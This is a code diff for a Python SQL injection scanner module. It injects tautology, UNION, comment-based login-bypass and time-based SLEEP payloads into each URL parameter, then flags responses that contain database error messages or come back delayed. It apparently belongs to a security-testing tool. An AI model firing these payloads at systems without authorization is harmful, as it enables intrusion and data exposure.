@@ -1,67 +1,107 @@
+# backend/app/utils/sql_injection.py
 import requests
 import time
+from urllib.parse import urlparse, parse_qs
+import logging
+from bs4 import BeautifulSoup
 
-# List of common SQL payloads to test against the target URL
-COMMON_SQL_PAYLOADS = [
-    "' OR '1'='1",  # Simple SQL injection that tries to return true for all queries
-    "' OR 1=1 --",  # Attempts to unconditionally return all data, with comment to block remaining SQL
-    "' OR 'a'='a",  # Tautology based injection, always true
-    "admin'--"      # Payload that aims to bypass login by commenting out the password check
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# SQL Payloads and Error Signatures (unchanged from your code)
+ADVANCED_SQL_PAYLOADS = [
+    "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "admin'--", 
+    "' UNION SELECT 1,2,3 --", "' AND 'x'='x", "' AND SLEEP(5) --", 
+    "' AND 1=CAST(CHAR(97)+CHAR(98)+CHAR(99) AS NVARCHAR(4000)) --", 
+    "admin' #", "' ORDER BY 1--", "' OR 'x'='x'/*"
 ]
 
-# Time-based SQL payload to identify blind SQL injection vulnerabilities
-TIME_BASED_SQL_PAYLOAD = "' OR IF(1=1, SLEEP(3), 0) --"
+TIME_BASED_SQL_PAYLOAD = "' OR IF(1=1, SLEEP(5), 0) --"
 
-def check_sql_injection(url):
-    """
-    Performs a security test on the provided URL to check for SQL injection vulnerabilities.
-    - Injects various SQL payloads to check for typical SQL injection vulnerabilities.
-    - Additionally checks for time-based blind SQL injection by inducing a delay in the response.
+ERROR_SIGNATURES = [
+    "sql syntax", "mysql", "syntax error", "unclosed quotation mark", 
+    "odbc microsoft access", "warning: mysql", "quoted string not properly terminated", 
+    "mariaDB", "pg_query", "psql:", "error in your SQL syntax"
+]
 
-    Args:
-        url (str): The URL of the web application to test for SQL injection vulnerabilities.
+def check_sql_injection(url, extra_params=None, max_tests=10):
+    results = {
+        "action": "check_sql",
+        "url": url,
+        "vulnerable_params": [],
+        "time_based_test": None
+    }
+    
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+    original_params = parse_qs(parsed.query)
+    
+    if extra_params:
+        for k, v in extra_params.items():
+            original_params[k] = [v]
+    
+    if not original_params:
+        original_params = {"id": ["1"]}
 
-    Returns:
-        list: A list of dictionaries, each containing the payload used and the test results.
-    """
+    for param, values in list(original_params.items()):
+        original_value = values[0]
+        tested_count = 0
+        
+        for payload in ADVANCED_SQL_PAYLOADS:
+            if tested_count >= max_tests:
+                break
+            
+            test_params = original_params.copy()
+            test_params[param] = [payload]
+            
+            try:
+                r = requests.get(base_url, params=test_params, timeout=5)
+                combined_text = r.text.lower()
+                if any(err_sig in combined_text for err_sig in ERROR_SIGNATURES):
+                    results["vulnerable_params"].append({
+                        "param": param,
+                        "payload": payload,
+                        "vulnerable": True,
+                        "evidence": "SQL error signature found in response"
+                    })
+                else:
+                    results["vulnerable_params"].append({
+                        "param": param,
+                        "payload": payload,
+                        "vulnerable": False
+                    })
+            except requests.RequestException as e:
+                logger.warning(f"Request failed for {url} with payload {payload}: {e}")
+            
+            tested_count += 1
 
-    results = []  # Stores results of the injection tests
-
-    # Test each payload in the common list
-    for payload in COMMON_SQL_PAYLOADS:
-        test_url = f"{url}?q={payload}"  # Append payload to URL query parameter 'q'
-        try:
-            response = requests.get(test_url, timeout=5)  # Making an HTTP GET request
-            # Check for SQL error messages in the response
-            if any(err in response.text.lower() for err in ["sql syntax", "mysql", "syntax error"]):
-                results.append({
-                    "payload": payload,
-                    "vulnerable": True,
-                    "evidence": "SQL error found in response"
-                })
-            else:
-                results.append({
-                    "payload": payload,
-                    "vulnerable": False
-                })
-        except requests.RequestException:
-            # Handle exceptions such as timeout, connection error
-            pass
-
-    # Additional check for time-based blind SQL injection
+    first_param = next(iter(original_params))
+    test_params = original_params.copy()
+    test_params[first_param] = [TIME_BASED_SQL_PAYLOAD]
+    
     try:
         start_time = time.time()
-        requests.get(f"{url}?q={TIME_BASED_SQL_PAYLOAD}", timeout=10)
+        requests.get(base_url, params=test_params, timeout=10)
         end_time = time.time()
-        # Check if response time was significantly longer than the timeout threshold
-        if end_time - start_time > 2:
-            results.append({
+        
+        if end_time - start_time > 4:
+            results["time_based_test"] = {
                 "payload": TIME_BASED_SQL_PAYLOAD,
                 "vulnerable": True,
-                "evidence": "Response time delay detected (possible blind SQL injection)"
-            })
-    except requests.RequestException:
-        # Handle exceptions for the time-based payload
-        pass
-
-    return results  # Return all results from the tests
+                "evidence": "Significant response delay (possible blind SQL injection)"
+            }
+        else:
+            results["time_based_test"] = {
+                "payload": TIME_BASED_SQL_PAYLOAD,
+                "vulnerable": False
+            }
+    except requests.RequestException as e:
+        results["time_based_test"] = {
+            "payload": TIME_BASED_SQL_PAYLOAD,
+            "vulnerable": False,
+            "note": f"RequestException encountered: {str(e)}"
+        }
+    
+    logger.info(f"SQL Injection scan completed for {url}")
+    return results
